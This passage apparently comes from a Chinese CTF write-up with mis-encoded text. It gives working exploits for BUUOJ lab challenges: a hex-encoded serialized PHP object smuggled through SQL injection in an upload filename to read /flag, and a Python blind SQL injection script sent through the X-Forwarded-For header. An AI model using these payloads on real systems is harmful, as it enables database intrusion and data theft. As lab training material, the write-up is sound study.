variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" filename="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" path="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>You have not uploaded an image yet.&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Delete_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"DELETE FROM images"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰¾åˆ°å¯ä¾›åˆ©ç”¨çš„æ–¹æ³•</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">view_files</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ifview</span> <span class="token operator">==</span> <span class="token constant boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token comment">//The function is not yet perfect, it is not open yet.</span><span class="token punctuation">&#125;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ååºåˆ—åŒ–çš„æ–¹æ³•</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM images"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$attr_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$attr_temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>id="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" filename="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" path="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åºåˆ—åŒ–çš„æ–¹æ³•</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"title"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ext"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$img_ext</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$my_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"width"</span><span class="token operator">=></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"height"</span><span class="token operator">=></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$my_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Your images is uploaded successfully. And your image's id is <span class="token interpolation"><span class="token variable">$id</span></span>.&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆæ„é€ helperç±»</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">helper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$ifview</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token operator">=</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//O:6:"helper":2:&#123;s:9:"*ifview";b:1;s:9:"*config";s:5:"/flag";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¢˜ç›®ä¸­ä¼šå°†åºåˆ—åŒ–åçš„\0*\0è½¬ä¸º\0\0\0å†å­˜å…¥æ•°æ®åº“å¹¶ä¸”åœ¨å–å‡ºæ˜¯é€†å‘ä½¿ç”¨ï¼Œå…¶å®å¯¹äºæˆ‘ä»¬çš„æ³¨å…¥æ²¡æœ‰ä»»ä½•å½±å“</p><p>ç„¶åæŸ¥çœ‹sqlè¯­å¥æ„é€ æ–¹æ³•<code>$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</code>åœ¨è¯¥æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨#æˆªæ–­æ¥æ³¨é‡Šæ‰åé¢å†…å®¹ï¼Œåœ¨æ–‡ä»¶åå¤„æ„é€ payloadè¿›è¡Œsqlæ³¨å…¥ï¼Œè€Œ\0å­—ç¬¦ä¸æ˜¾ç¤ºï¼Œä½¿ç”¨16è¿›åˆ¶ç¼–ç æ¥å°†å­—ç¬¦ä¸²æ³¨å…¥</p><pre class="line-numbers language-none"><code class="language-none">payloadï¼šæ–‡ä»¶åï¼š1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp1-Welcome"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp1-Welcome" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome</h2><p>405æ¢POSTï¼Œ<code>roam1[]=1&amp;roam2[]=2</code></p><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>çœ‹æºç ï¼Œå‘ç°æ³¨é‡Šä¸­å­˜åœ¨æˆ‘ä»¬çš„ä¿¡æ¯ï¼Œå­˜åœ¨Last IPï¼Œåº”è¯¥æ˜¯è¢«å†™å…¥äº†æ•°æ®åº“ï¼Œå°è¯•åœ¨X-Forward-Forå¤„æ„é€ payloadï¼Œç¡®å®å­˜åœ¨ï¼Œä½¿ç”¨<code>1&#39; or &#39;1</code>è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°è¿”å›çš„Last IPå˜æˆäº†1ï¼Œè¯´æ˜å­˜åœ¨SQLæ³¨å…¥ï¼Œæ„é€ è¯­å¥</p><pre class="line-numbers language-none"><code class="language-none">0&#39; or if() or &#39;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·åœ¨ç»“æœæ­£ç¡®æ—¶å°±ä¼šè¿”å›1</p><p>è¯­å¥çš„æ‰§è¡Œé¡ºåºæ˜¯</p><p>1ã€è¯»å–IPï¼Œå¹¶ä¸”å›æ˜¾åˆ°Current IPä½ç½®</p><p>2ã€ä¼ å…¥ä»»æ„ä¸åŒIPï¼Œæ­¤æ—¶Last IPä¸­çš„è¯­å¥è¢«å†™å…¥æ•°æ®åº“</p><p>3ã€ä¼ å…¥ç¬¬äºŒæ¬¡è®¿é—®çš„IPï¼Œæ­¤æ—¶ç”±äºä¸ä¸Šæ¬¡è®¿é—®IPç›¸åŒï¼Œä¼šä»æ•°æ®åº“ä¸­å–å‡ºæ³¨å…¥çš„è¯­å¥å¹¶ä¸”æ‰§è¡Œå›æ˜¾ï¼Œå®Œæˆæ³¨å…¥</p><p>æ„é€ <del>å·</del>è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8 </span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://node3.buuoj.cn:25869/'</span>res <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    left <span class="token operator">=</span> <span class="token number">31</span>    right <span class="token operator">=</span> <span class="token number">127</span>    mid <span class="token operator">=</span> left <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>        <span class="token comment">#payload = "0' or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))>&#123;&#125;) or '0".format(i,mid)</span>        <span class="token comment">#payload  = "0' or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'F4l9_D4t4B45e'),&#123;&#125;,1))>&#123;&#125;) or '0".format(i,mid)</span>        <span class="token comment">#payload  = "0' or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 'F4l9_t4b1e'),&#123;&#125;,1))>&#123;&#125;) or '0".format(i,mid)</span>        payload <span class="token operator">=</span> <span class="token string">"0' or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))>&#123;&#125;) or '0"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                    <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3'</span><span class="token punctuation">,</span>                    <span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> payload                    <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">'111'</span>        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                    <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3'</span><span class="token punctuation">,</span>                    <span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> payload                    <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">'111'</span>        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                    <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3'</span><span class="token punctuation">,</span>                    <span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> payload                    <span class="token punctuation">&#125;</span>         r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">429</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'too fast'</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Last Ip: 1'</span>  <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">elif</span> <span class="token string">'Last Ip: 1'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            right <span class="token operator">=</span> mid         mid <span class="token operator">=</span> left <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> mid <span class="token operator">==</span> <span class="token number">31</span> <span class="token keyword">or</span> mid <span class="token operator">==</span> <span class="token number">127</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e</span><span class="token comment">#F4l9_t4b1e</span><span class="token comment">#F4l9_C01uMn</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p>ä¼ å›¾ç‰‡é©¬ä¸é€šè¿‡ä¼°è®¡æ˜¯å› ä¸º<code>getimagesize</code>æ²¡æœ‰æ‹¿åˆ°å¤§å°ä¿¡æ¯ï¼Œè‡ªå·±æä¸€ä¸ªå°±è¡Œï¼Œä¸Šä¼ å‘ç°å•¥ä¹Ÿæ²¡å¾—ï¼Œå°±æ¢äº†ä¸ªå¤´åƒï¼Œçœ‹æºç å’¯</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lib/util.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lib/session.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecureClientSession</span><span class="token punctuation">(</span><span class="token constant">CLIENT_SESSION_ID</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// check whether file is uploaded</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No file was uploaded.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file size</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded file is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file type</span><span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">finfo_close</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded file is not PNG format.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file width/height</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span> <span class="token operator">||</span> <span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded image is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// I hope this never happens...</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'What happened...? OK, the flag for part 1 is: &lt;code>'</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG1'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/code>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ok</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.png'</span><span class="token punctuation">;</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_DIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$session</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'avatar'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">flash</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'info'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Your avatar has been successfully updated!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token 